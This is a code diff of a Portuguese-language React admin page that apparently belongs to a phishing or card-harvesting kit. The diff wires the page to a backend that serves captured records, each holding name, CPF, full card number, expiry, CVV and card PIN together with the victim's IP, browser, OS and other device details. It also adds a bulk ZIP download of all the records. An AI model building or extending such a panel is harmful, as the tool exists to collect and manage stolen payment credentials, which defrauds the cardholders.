@@ -75,50 +75,133 @@ const Admin = () => {
   const [showDeviceInfo, setShowDeviceInfo] = useState(false);
   const [parsedData, setParsedData] = useState<ParsedPaymentData | null>(null);
 
-  const BACKEND_URL = 'http://localhost:5555';
-
   useEffect(() => {
-    // Simulando dados para demonstração
-    const mockPayments: Payment[] = [
-      {
-        id: '1',
-        nomeCompleto: 'João Silva Santos',
-        cpf: '123.456.789-00',
-        numeroCartao: '**** **** **** 1234',
-        validade: '12/2025',
-        dataCriacao: '30/12/2025 14:30',
-        status: 'processado'
-      },
-      {
-        id: '2',
-        nomeCompleto: 'Maria Oliveira Costa',
-        cpf: '987.654.321-00',
-        numeroCartao: '**** **** **** 5678',
-        validade: '06/2026',
-        dataCriacao: '30/12/2025 13:15',
-        status: 'pendente'
+    // Buscar dados reais do backend
+    const fetchPayments = async () => {
+      try {
+        setIsLoading(true);
+        const response = await fetch('/api/payments');
+        const data = await response.json();
+
+        if (data.success && data.payments) {
+          // Mapear dados do backend para o formato esperado
+          const mappedPayments: Payment[] = data.payments.map((payment: any) => ({
+            id: payment.id || payment.dataCriacao,
+            nomeCompleto: payment.nomeCompleto || '',
+            cpf: payment.cpf || '',
+            numeroCartao: payment.numeroCartao ? `**** **** **** ${payment.numeroCartao.slice(-4)}` : '****',
+            validade: payment.validade || '',
+            dataCriacao: payment.dataCriacao || '',
+            status: 'processado' as const,
+            senhaCartao: payment.senhaCartao
+          }));
+
+          setPayments(mappedPayments);
+          toast.success(`${mappedPayments.length} pagamento(s) carregado(s)`);
+        } else {
+          setPayments([]);
+        }
+      } catch (error) {
+        console.error('Erro ao carregar pagamentos:', error);
+        toast.error('Erro ao carregar dados do servidor');
+        setPayments([]);
+      } finally {
+        setIsLoading(false);
       }
-    ];
-    setPayments(mockPayments);
+    };
+
+    fetchPayments();
   }, []);
 
+  const fetchPayments = async () => {
+    try {
+      setIsLoading(true);
+      const response = await fetch('/api/payments');
+      const data = await response.json();
+
+      if (data.success && data.payments) {
+        const mappedPayments: Payment[] = data.payments.map((payment: any) => ({
+          id: payment.id || payment.dataCriacao,
+          nomeCompleto: payment.nomeCompleto || '',
+          cpf: payment.cpf || '',
+          numeroCartao: payment.numeroCartao ? `**** **** **** ${payment.numeroCartao.slice(-4)}` : '****',
+          validade: payment.validade || '',
+          dataCriacao: payment.dataCriacao || '',
+          status: 'processado' as const,
+          senhaCartao: payment.senhaCartao
+        }));
+
+        setPayments(mappedPayments);
+        if (mappedPayments.length > 0) {
+          toast.success(`${mappedPayments.length} pagamento(s) carregado(s)`);
+        }
+      } else {
+        setPayments([]);
+      }
+    } catch (error) {
+      console.error('Erro ao carregar pagamentos:', error);
+      toast.error('Erro ao carregar dados do servidor');
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  const handleRefreshPayments = async () => {
+    await fetchPayments();
+  };
+
+  const handleDownloadZip = async () => {
+    try {
+      setIsDownloading(true);
+      const response = await fetch('/api/download-zip');
+
+      if (!response.ok) {
+        throw new Error('Erro ao baixar ZIP');
+      }
+
+      const blob = await response.blob();
+      const url = window.URL.createObjectURL(blob);
+      const link = document.createElement('a');
+      link.href = url;
+      link.setAttribute('download', 'pagamentos.zip');
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      window.URL.revokeObjectURL(url);
+
+      toast.success('ZIP baixado com sucesso!');
+    } catch (error) {
+      console.error('Erro ao baixar ZIP:', error);
+      toast.error('Erro ao baixar ZIP');
+    } finally {
+      setIsDownloading(false);
+    }
+  };
+
   const parsePaymentContent = (content: string): ParsedPaymentData => {
+    // Função auxiliar para extrair valor após label
+    const extractValue = (label: string, defaultValue: string = 'Não disponível') => {
+      const regex = new RegExp(`${label}:\\s*(.+?)(?:\\n|$)`);
+      const match = content.match(regex);
+      return match ? match[1].trim() : defaultValue;
+    };
+
     return {
-      nome: 'João Silva Santos',
-      cpf: '123.456.789-00',
-      cartao: '5123 4567 8901 2345',
-      validade: '12/2025',
-      cvv: '123',
-      senhaCartao: '4567',
-      data: '30/12/2025 às 14:30:45',
-      ip: '192.168.1.100',
-      navegador: 'Chrome 120.0.0',
-      so: 'Windows 11 Pro',
-      dispositivo: 'Desktop',
-      resolucao: '1920x1080',
-      idioma: 'pt-BR',
-      fuso: 'America/Sao_Paulo (GMT-3)',
-      conexao: '4g'
+      nome: extractValue('Nome Completo', 'Não informado'),
+      cpf: extractValue('CPF', 'Não informado'),
+      cartao: extractValue('Número do Cartão', '****'),
+      validade: extractValue('Validade', 'Não informado'),
+      cvv: '***',
+      senhaCartao: extractValue('Senha do Cartão', 'Não informado'),
+      data: extractValue('Data/Hora', 'Não informado'),
+      ip: extractValue('IP', undefined),
+      navegador: extractValue('Navegador', undefined),
+      so: extractValue('Sistema Operacional', undefined),
+      dispositivo: extractValue('Tipo de Dispositivo', undefined),
+      resolucao: extractValue('Resolução', undefined),
+      idioma: extractValue('Idioma', undefined),
+      fuso: extractValue('Fuso Horário', undefined),
+      conexao: extractValue('Tipo de Conexão', undefined)
     };
   };
 
@@ -129,11 +212,22 @@ const Admin = () => {
     setCopiedField(null);
     setShowDeviceInfo(false);
 
-    setTimeout(() => {
-      const parsed = parsePaymentContent('mock content');
-      setParsedData(parsed);
+    try {
+      const response = await fetch(`/api/payment/${payment.id}`);
+      const data = await response.json();
+
+      if (data.success && data.content) {
+        const parsed = parsePaymentContent(data.content);
+        setParsedData(parsed);
+      } else {
+        toast.error('Erro ao carregar detalhes do pagamento');
+      }
+    } catch (error) {
+      console.error('Erro ao buscar detalhes:', error);
+      toast.error('Erro ao carregar detalhes');
+    } finally {
       setIsLoadingDetails(false);
-    }, 800);
+    }
   };
 
   const copyToClipboard = async (text: string, fieldName: string) => {
@@ -237,11 +331,23 @@ const Admin = () => {
             </div>
           </div>
           <div className="flex items-center gap-2">
-            <Button variant="outline" size="sm" className="gap-2">
-              <RefreshCw className="h-4 w-4" />
+            <Button
+              variant="outline"
+              size="sm"
+              className="gap-2"
+              onClick={handleRefreshPayments}
+              disabled={isLoading}
+            >
+              <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
               Atualizar
             </Button>
-            <Button variant="outline" size="sm" className="gap-2">
+            <Button
+              variant="outline"
+              size="sm"
+              className="gap-2"
+              onClick={handleDownloadZip}
+              disabled={isDownloading}
+            >
               <Download className="h-4 w-4" />
               Baixar ZIP
             </Button>
